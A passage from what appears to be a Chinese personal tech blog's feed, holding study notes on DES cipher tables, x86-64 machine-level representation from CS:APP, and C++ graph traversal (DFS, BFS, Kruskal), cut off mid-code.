class="number">9</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">8</span>,<span class="number">6</span>&#125;,  </span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">2</span>&#125;,  </span><br><span class="line">&#123;<span class="number">6</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">12</span>&#125;  </span><br><span class="line">&#125;, </span><br><span class="line">&#123;  </span><br><span class="line">&#123;<span class="number">13</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">7</span>&#125;,  </span><br><span class="line">&#123;<span class="number">1</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">2</span>&#125;,  </span><br><span class="line">&#123;<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>&#125;,  </span><br><span class="line">&#123;<span class="number">2</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>&#125;  </span><br><span class="line">&#125; </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// P置换，32位 -&gt; 32位 轮函数的最后置换</span></span><br><span class="line"><span class="keyword">int</span> P[] = &#123;<span class="number">16</span>,  <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">   <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>,</span><br><span class="line">    <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">    <span class="number">2</span>,  <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>,</span><br><span class="line">   <span class="number">32</span>, <span class="number">27</span>,  <span class="number">3</span>,  <span class="number">9</span>,</span><br><span class="line">   <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>,  <span class="number">6</span>,</span><br><span class="line">   <span class="number">22</span>, <span class="number">11</span>,  <span class="number">4</span>, <span class="number">25</span> &#125;;</span><br></pre></td></tr></table></figure><p><img src="/2020/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/image-20201206221939956.png" class="lazyload" data-srcset="/2020/11/24/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/image-20201206221939956.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201206221939956"></p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>深入理解计算机系统-程序的机器级表示</title>
      <link href="/2020/11/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/"/>
      <url>/2020/11/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="1-程序编码"><a href="#1-程序编码" class="headerlink" title="1.程序编码"></a>1.程序编码</h1><p>1.<code>gcc -0g -o p p1.c p2.c</code></p><p>编译选项<code>-Og</code>告诉表一起使用生成符合原始C代码的整体结构的机器代码的优先优化等级，使用较高优化产生的代码会严重变形，以至于产生的机器代码和初始源代码之间的关系非常难以理解。实际使用中，从得到的程序性能考虑，较高级别的的优化<code>-O1</code>，<code>-O2</code>被认为是较好的选择。编译器产生两个源文件的汇编代码，名字分别叫做p1.s和p2.s。接下来编译器会将汇编代码转化成二进制的目标文件p1.o和p2.o。目标代码是机器代码的一种形式，它包含的所有指令的二进制表示，但是还没完全填入全局区值得的地址。最后，连接器将两个目标代码文件与实现库函数的代码合并，并产生最终的可执行文件，上面又命令行<code>-o p</code>实现。</p><p><code>gcc -Og -S xxx.c</code> 会产生一个xxx.s的汇编文件</p><p><code>gcc -Og -c xxx.c</code> 会产生一个xxx.o的二进制代码文件</p><h1 id="2-数据格式"><a href="#2-数据格式" class="headerlink" title="2.数据格式"></a>2.数据格式</h1><p>在X86-64，标准int值存储为双字4字节共32位，指针存储为四字八字节共64位，数据类型long实现为64位，表示的范围也较大。</p><table><thead><tr><th>C声明</th><th>Intel数据类型</th><th>汇编代码后缀</th><th>大小（字节）</th></tr></thead><tbody><tr><td>char</td><td>字节</td><td>b（byte）</td><td>1</td></tr><tr><td>short</td><td>字</td><td>w（word）</td><td>2</td></tr><tr><td>int</td><td>双字</td><td>l（long word）</td><td>4</td></tr><tr><td>long</td><td>四字</td><td>q（quad words）</td><td>8</td></tr><tr><td>char *（指针）</td><td>四字</td><td>q（quad words）</td><td>8</td></tr><tr><td>float</td><td>单精度</td><td>s</td><td>4</td></tr><tr><td>double</td><td>双精度</td><td>l</td><td>8</td></tr></tbody></table><h1 id="3-访问信息"><a href="#3-访问信息" class="headerlink" title="3.访问信息"></a>3.访问信息</h1><p>一个64位机器包含一个存储64位置的通用目的寄存器，这些寄存器用来存储整数数据和指针。32扩展到64位机器主要多了%r8-%r15八个新的寄存器。<img src="/2020/11/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/image-20201119152414995.png" class="lazyload" data-srcset="/2020/11/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/image-20201119152414995.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201119152414995"></p><p>在通用寄存器中%rdi、%rsi、%rdx、%rcx、%8、%9分别是调用函数1-6个参数的值，然后多余参数压入栈中。</p><h1 id="4-操作数指示符"><a href="#4-操作数指示符" class="headerlink" title="4.**操作数指示符"></a>4.**操作数指示符</h1><p>大多数指令有一个或多个操作数，指示出执行一个操作要使用的原数据的值，以及放置结果的目的位置；。x86-64支持多种操作数格式，源数据值可以以常数形式给出，或是从寄存器或内存中读出。结果可以存放字寄存器或内存中。因此，各种不同的操作数的可能性被分为三种类型。</p><p>第一种类型是立即数，用来表示常数值，在ATT格式的汇编代码中，立即数的书写格式$后面跟一个标准C表示法表示的整数。不同指令允许的立即数值放了为不同，汇编器会自动选择最紧凑的方式进行数值编码。</p><p>第二种类型是寄存器，它表示某个寄存器的内容，16个寄存器的低位1字节、2字节、4字节或8字节中的一个作为操作数，这些字节数分别对应于8位、16位、32位或64位。在下图中，用符号ra来表示任意寄存器a，用引用R[ra]来表示它的值，这是将寄存器集合看成一个数组R，用寄存器标识符作为索引。</p><p>第三种类型是内存引用，它会根据计算出来的地址访问某个内存地址。因为将内存看成一个很大的字节数组，我们用符号Mb[Addr]表示对存储在内存中从地址Addr开始的b个字节值的引用。</p><p>如下表所示，不同形式的寻址模式，允许不同形式的内存引用。<img src="/2020/11/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/image-20201119155236051.png" class="lazyload" data-srcset="/2020/11/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/image-20201119155236051.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201119155236051"></p><p>其中要区分<code>Imm(a,b,c)</code>和<code>Imm(a,b)</code>。 有两个逗号的应该<code>b*c+a+Imm</code>，一个逗号就直接就<code>b+a+Imm</code>，只有寄存器单独存在，不加任何括号时，则代表里面存的是实际的值，否则都是需要指向内存的值（地址）。</p><p><strong>图中比例因子s必须为1,2,4,8</strong></p><h1 id="5-数据传送指令"><a href="#5-数据传送指令" class="headerlink" title="5.数据传送指令"></a>5.数据传送指令</h1>]]></content>
      
      
      <categories>
          
          <category> 深入理解计算机系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构-图的遍历</title>
      <link href="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/"/>
      <url>/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<h1 id="1-深度优先搜索"><a href="#1-深度优先搜索" class="headerlink" title="1.深度优先搜索"></a>1.深度优先搜索</h1><p><strong>1.定义图的类型</strong></p><p>其中matrix为一个二维指针，存一个二维数组用于临接矩阵，vex为int的一个一维数组，用于存顶点信息。</p><p>vexnum为顶点的个数，arcnum为弧的个数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MGraph</span>&#123;</span></span><br><span class="line">  <span class="keyword">public</span>:<span class="keyword">int</span> **matrix;</span><br><span class="line">  <span class="keyword">public</span>:<span class="keyword">int</span> *vex;</span><br><span class="line">  <span class="comment">//顶点数以及弧边数</span></span><br><span class="line">  <span class="keyword">public</span>:<span class="keyword">int</span> vexnum,arcnum;</span><br><span class="line">  <span class="built_in">MGraph</span>(<span class="keyword">int</span> vexnum,<span class="keyword">int</span> arcnum)&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;vexnum=vexnum;</span><br><span class="line">    <span class="keyword">this</span>-&gt;arcnum=arcnum;</span><br><span class="line">    matrix=<span class="keyword">new</span> <span class="keyword">int</span>*[vexnum];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexnum;i++)&#123;</span><br><span class="line">      matrix[i]=<span class="keyword">new</span> <span class="built_in"><span class="keyword">int</span></span>(vexnum);</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;vexnum;j++)&#123;</span><br><span class="line">        matrix[i][j]=<span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vex=<span class="keyword">new</span> <span class="built_in"><span class="keyword">int</span></span>(vexnum);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexnum;i++)</span><br><span class="line">      vex[i]=i;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>2.深度优先搜索递归函数</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(MGraph *mgraph,<span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">  matrix_all_bool[v]=<span class="literal">true</span>;</span><br><span class="line">  <span class="comment">//访问节点函数</span></span><br><span class="line">  <span class="built_in">visitVex</span>(mgraph,v);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> w=<span class="built_in">FirstAdjVex</span>(mgraph,v);w&gt;=<span class="number">0</span>;w=<span class="built_in">NextAdjVex</span>(mgraph,v,w))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!matrix_all_bool[w])&#123;</span><br><span class="line">        <span class="built_in">DFS</span>(mgraph,w);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中v为访问元素的位置，即进入该函数比该位置没被访问，然后用一个for循环去遍历该函数的临接节点，如果该临接节点没被访问，则递归调用该函数。</p><p><code>FistAdjVex(mgraph,v)</code></p><p>该函数找出v节点的从小到大的第一个临接节点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FirstAdjVex</span><span class="params">(MGraph *mgraph,<span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">  <span class="comment">//查与数组下标为v的顶点之间有有边的顶点，返回它在数组中的下标</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;mgraph-&gt;vexnum;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(mgraph-&gt;matrix[v][i])&#123;</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>NextAdjVex(mgraph,v)</code></p><p>该函数是找按从小到大的顺序找下一个临接节点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">NextAdjVex</span><span class="params">(MGraph *mgraph,<span class="keyword">int</span> v,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=w+<span class="number">1</span>;i&lt;mgraph-&gt;vexnum;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(mgraph-&gt;matrix[v][i])&#123;</span><br><span class="line">      <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>w</code>变量，如果能找到临接节点代表的是数组下标，也就是顶点的值，如果循环一次找不到节点则输出的是-1。</p><p>入口函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFSTraverse</span><span class="params">(MGraph *mgraph)</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;mgraph-&gt;vexnum;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!matrix_all_bool[i])&#123;</span><br><span class="line">      <span class="built_in">DFS</span>(mgraph,i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2-广度优先搜索"><a href="#2-广度优先搜索" class="headerlink" title="2.广度优先搜索"></a>2.广度优先搜索</h1><p><strong>1.广度优先搜索函数</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BFSTraverse</span><span class="params">(MGraph *mgraph)</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;mgraph-&gt;vexnum;i++)</span><br><span class="line">    matrix_all_bool[i]=<span class="literal">false</span>;</span><br><span class="line">  Queue* queue=<span class="keyword">new</span> Queue;</span><br><span class="line">  queue-&gt;next=<span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;mgraph-&gt;vexnum;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!matrix_all_bool[i])&#123;</span><br><span class="line">        matrix_all_bool[i]=<span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">visitVex</span>(mgraph,i);</span><br><span class="line">        <span class="built_in">Enqueue</span>(queue,i);</span><br><span class="line">        <span class="keyword">while</span>(!<span class="built_in">isemqueue</span>(queue))&#123;</span><br><span class="line">            <span class="comment">//出队的元素</span></span><br><span class="line">            <span class="keyword">int</span> point_num;</span><br><span class="line">            <span class="built_in">Dequeue</span>(queue,point_num);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="built_in">FirstAdjVex</span>(mgraph,point_num);j&gt;=<span class="number">0</span>;j=<span class="built_in">NextAdjVex</span>(mgraph,point_num,j))&#123;</span><br><span class="line">                <span class="keyword">if</span>(!matrix_all_bool[j])&#123;</span><br><span class="line">                  matrix_all_bool[j]=<span class="literal">true</span>;</span><br><span class="line">                  <span class="built_in">visitVex</span>(mgraph,j);</span><br><span class="line">                  <span class="built_in">Enqueue</span>(queue,j);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中比较主要是的一个入队以及出队的操作，首先遇到一个节点，判断该节点是否已经遍历过。若没遍历过，先将该节点入队，然后访问该节点，剩下来判断队列是否为空，若不为空进入循环，并且出队拿到该节点的数据，利用该节点的数据去遍历临接矩阵，将于该节点相临的所有节点全都入队。</p><p><strong>2.队列操作代码</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//入队</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Enqueue</span><span class="params">(Queue *queue,<span class="keyword">int</span> point)</span></span>&#123;</span><br><span class="line">  Queue *temp=<span class="keyword">new</span> Queue;</span><br><span class="line">  temp-&gt;num_point=point;</span><br><span class="line">  temp-&gt;next=<span class="literal">nullptr</span>;</span><br><span class="line">  <span class="comment">//循环队列指针</span></span><br><span class="line">  Queue *temp_point=queue;</span><br><span class="line">  <span class="keyword">while</span>(temp_point-&gt;next!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">    temp_point=temp_point-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  temp_point-&gt;next=temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//出队</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dequeue</span><span class="params">(Queue *queue,<span class="keyword">int</span> &amp;point)</span></span>&#123;</span><br><span class="line">  point=queue-&gt;next-&gt;num_point;</span><br><span class="line">  queue-&gt;next=queue-&gt;next-&gt;next;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断队列是否为空</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isemqueue</span><span class="params">(Queue *queue)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(queue-&gt;next==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-遍历的测试数据"><a href="#3-遍历的测试数据" class="headerlink" title="3.遍历的测试数据"></a>3.遍历的测试数据</h1><table><thead><tr><th>0</th><th>1</th><th>28</th></tr></thead><tbody><tr><td>0</td><td>5</td><td>10</td></tr><tr><td>1</td><td>2</td><td>16</td></tr><tr><td>1</td><td>6</td><td>14</td></tr><tr><td>2</td><td>3</td><td>12</td></tr><tr><td>3</td><td>4</td><td>22</td></tr><tr><td>3</td><td>6</td><td>18</td></tr><tr><td>4</td><td>5</td><td>25</td></tr><tr><td>4</td><td>6</td><td>24</td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><p><img src="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20201117203215193.png" class="lazyload" data-srcset="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20201117203215193.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201117203215193"></p><h1 id="4-最小生成树-克鲁斯卡尔算法"><a href="#4-最小生成树-克鲁斯卡尔算法" class="headerlink" title="4.最小生成树 克鲁斯卡尔算法"></a>4.最小生成树 克鲁斯卡尔算法</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最小生成树的算法 克鲁斯卡尔(Kruskal)算法</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Find</span><span class="params">(<span class="keyword">int</span> *parent,<span class="keyword">int</span> f)</span></span>&#123;</span><br><span class="line">  <span class="keyword">while</span>(parent[f]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    f=parent[f];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> f;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MinSpanTree_Kruskal</span><span class="params">(MGraph *mgraph)</span></span>&#123;</span><br><span class="line">    Edges edges[mgraph-&gt;arcnum];</span><br><span class="line">    <span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;mgraph-&gt;vexnum;i++)&#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;mgraph-&gt;vexnum;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(mgraph-&gt;matrix[i][j]!=<span class="number">0</span>&amp;&amp;mgraph-&gt;matrix[i][j]&lt;<span class="number">999</span>)&#123;</span><br><span class="line">          edges[k].begin=i;edges[k].end=j;edges[k].weight=mgraph-&gt;matrix[i][j];</span><br><span class="line">          k++;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//冒泡排序</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span 